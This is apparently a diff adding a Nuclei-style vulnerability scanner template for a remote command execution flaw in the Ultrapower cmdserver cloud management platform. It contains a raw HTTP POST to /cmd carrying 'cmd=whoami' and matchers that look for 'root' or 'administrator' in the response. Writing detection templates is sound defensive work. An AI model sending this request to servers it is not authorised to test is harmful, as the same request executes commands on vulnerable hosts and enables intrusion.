@@ -1,0 +1,29 @@
+id: ultrapower-cmdserver-rce
+info:
+  name: Ultrapower Cmdserver Cloud Management Platform RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    There is a remote command execution vulnerability in the Shenzhou Taiyue cmdserver cloud management platform. Attackers can execute commands by crafting specific network requests, potentially gaining full control over the web server. Affected versions are before 2020.
+  tags: rce, command-execution
+  reference:
+    - https://www.ultrapower.com.cn
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        POST /cmd HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd=whoami
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root"
+          - "administrator"
